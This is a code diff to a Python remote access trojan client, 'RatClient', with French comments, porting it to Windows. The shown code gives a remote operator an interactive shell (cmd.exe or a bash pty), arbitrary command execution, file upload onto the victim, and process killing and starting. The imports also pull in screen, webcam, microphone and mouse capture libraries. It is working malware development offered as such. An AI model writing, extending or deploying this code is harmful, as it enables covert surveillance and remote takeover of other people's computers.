@@ -20,10 +20,7 @@ import subprocess
 import sys
 import mss
 import mss.tools
-import pty
 import select
-import termios
-import signal
 import struct
 import fcntl
 from PIL import ImageGrab
@@ -32,6 +29,11 @@ from queue import Queue
 import cv2
 import pyaudio
 import wave
+
+# Imports spécifiques à Linux
+if platform.system() != 'Windows':
+    import pty
+    import termios
 
 class RatClient:
     def __init__(self):
@@ -269,9 +271,15 @@ class RatClient:
             for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status']):
                 try:
                     pinfo = proc.info
+                    # Adapter le nom du processus selon le système d'exploitation
+                    if platform.system() == 'Windows':
+                        name = pinfo['name']
+                    else:
+                        name = pinfo['name'] or 'Unknown'
+                    
                     processes.append({
                         'pid': pinfo['pid'],
-                        'name': pinfo['name'],
+                        'name': name,
                         'cpu': pinfo['cpu_percent'] or 0.0,
                         'memory': pinfo['memory_percent'] or 0.0,
                         'status': pinfo['status']
@@ -291,7 +299,12 @@ class RatClient:
         """Tue un processus."""
         try:
             process = psutil.Process(pid)
-            process.kill()
+            if platform.system() == 'Windows':
+                # Sous Windows, utiliser terminate() au lieu de kill()
+                process.terminate()
+            else:
+                # Sous Linux, utiliser kill()
+                process.kill()
             # Envoyer la liste mise à jour
             self.list_processes()
         except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
@@ -300,7 +313,17 @@ class RatClient:
     def start_process(self, cmd):
         """Démarre un nouveau processus."""
         try:
-            subprocess.Popen(cmd, shell=True)
+            if platform.system() == 'Windows':
+                # Sous Windows, utiliser CREATE_NEW_CONSOLE pour une meilleure visibilité
+                subprocess.Popen(
+                    cmd,
+                    shell=True,
+                    creationflags=subprocess.CREATE_NEW_CONSOLE
+                )
+            else:
+                # Sous Linux, utiliser le shell par défaut
+                subprocess.Popen(cmd, shell=True)
+            
             # Attendre un peu que le processus démarre
             time.sleep(0.5)
             # Envoyer la liste mise à jour
@@ -343,7 +366,9 @@ class RatClient:
     def upload_file(self, path, file_name, data):
         """Upload un fichier."""
         try:
-            with open(path, 'wb') as f:
+            # Assurer que le chemin est correct pour le système d'exploitation
+            file_path = os.path.join(path, file_name)
+            with open(file_path, 'wb') as f:
                 f.write(base64.b64decode(data))
             self.send_message({
                 'type': 'command_response',
@@ -531,69 +556,77 @@ class RatClient:
     def shell_loop(self):
         """Boucle du shell distant."""
         try:
-            master, slave = pty.openpty()
-            
-            # Configurer le terminal
-            old_settings = termios.tcgetattr(slave)
-            new_settings = termios.tcgetattr(slave)
-            new_settings[3] = new_settings[3] & ~termios.ECHO
-            termios.tcsetattr(slave, termios.TCSANOW, new_settings)
-            
-            # Démarrer le shell
-            shell = subprocess.Popen(
-                ['/bin/bash'],
-                stdin=slave,
-                stdout=slave,
-                stderr=slave,
-                universal_newlines=True
-            )
-            
-            # Boucle de lecture/écriture
-            while self.shell_running:
-                r, w, e = select.select([master], [], [], 0.1)
-                if master in r:
+            if platform.system() == 'Windows':
+                # Sous Windows, utiliser subprocess directement
+                process = subprocess.Popen(
+                    ['cmd.exe'],
+                    stdin=subprocess.PIPE,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    universal_newlines=True,
+                    creationflags=subprocess.CREATE_NEW_CONSOLE
+                )
+                
+                while self.shell_running:
                     try:
-                        data = os.read(master, 1024).decode()
-                        if data:
+                        # Lire la sortie
+                        output = process.stdout.readline()
+                        if output:
                             self.send_message({
-                                'type': 'shell_output',
-                                'data': data
+                                'type': 'command_response',
+                                'command': 'shell_output',
+                                'data': output
                             })
-                    except Exception:
+                    except Exception as e:
+                        print(f"Erreur de lecture du shell Windows: {e}")
                         break
-                        
-            # Nettoyage
-            termios.tcsetattr(slave, termios.TCSANOW, old_settings)
-            os.close(master)
-            os.close(slave)
-            shell.terminate()
+            else:
+                # Sous Linux, utiliser pty et termios
+                master, slave = pty.openpty()
+                
+                # Configurer le terminal
+                old_settings = termios.tcgetattr(slave)
+                new_settings = termios.tcgetattr(slave)
+                new_settings[3] = new_settings[3] & ~termios.ECHO
+                termios.tcsetattr(slave, termios.TCSANOW, new_settings)
+                
+                # Démarrer le shell
+                shell = subprocess.Popen(
+                    ['/bin/bash'],
+                    stdin=slave,
+                    stdout=slave,
+                    stderr=slave,
+                    universal_newlines=True
+                )
+                
+                # Boucle de lecture/écriture
+                while self.shell_running:
+                    r, w, e = select.select([master], [], [], 0.1)
+                    if master in r:
+                        try:
+                            data = os.read(master, 1024).decode()
+                            if data:
+                                self.send_message({
+                                    'type': 'command_response',
+                                    'command': 'shell_output',
+                                    'data': data
+                                })
+                        except Exception:
+                            break
+                
+                # Nettoyage Linux
+                termios.tcsetattr(slave, termios.TCSANOW, old_settings)
+                os.close(master)
+                os.close(slave)
+            
+            # Nettoyage commun
+            if 'process' in locals():
+                process.terminate()
+            if 'shell' in locals():
+                shell.terminate()
             
         except Exception as e:
             print(f"Erreur du shell : {e}")
-
-    def execute_shell_command(self, cmd):
-        """Exécute une commande shell."""
-        try:
-            process = subprocess.Popen(
-                cmd,
-                shell=True,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                universal_newlines=True
-            )
-            stdout, stderr = process.communicate()
-            output = stdout if stdout else stderr
-            self.send_message({
-                'type': 'command_response',
-                'command': 'shell_output',
-                'data': output
-            })
-        except Exception as e:
-            self.send_message({
-                'type': 'command_response',
-                'command': 'shell_output',
-                'data': f"Erreur : {str(e)}"
-            })
 
     def start_camera(self, interval=100):
         """Démarre la capture de la caméra."""
@@ -882,6 +915,42 @@ class RatClient:
             except Exception as e:
                 print(f"Erreur lors du suivi de la souris : {e}")
                 break
+
+    def execute_shell_command(self, cmd):
+        """Exécute une commande shell."""
+        try:
+            if platform.system() == 'Windows':
+                # Sous Windows, utiliser cmd.exe
+                process = subprocess.Popen(
+                    ['cmd.exe', '/c', cmd],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    universal_newlines=True,
+                    creationflags=subprocess.CREATE_NEW_CONSOLE
+                )
+            else:
+                # Sous Linux, utiliser bash
+                process = subprocess.Popen(
+                    ['/bin/bash', '-c', cmd],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    universal_newlines=True
+                )
+            
+            stdout, stderr = process.communicate()
+            output = stdout if stdout else stderr
+            self.send_message({
+                'type': 'command_response',
+                'command': 'shell_output',
+                'data': output
+            })
+        except Exception as e:
+            print(f"Erreur lors de l'exécution de la commande shell : {e}")
+            self.send_message({
+                'type': 'command_response',
+                'command': 'shell_output',
+                'data': f"Erreur : {str(e)}"
+            })
 
 def main():
     client = RatClient()
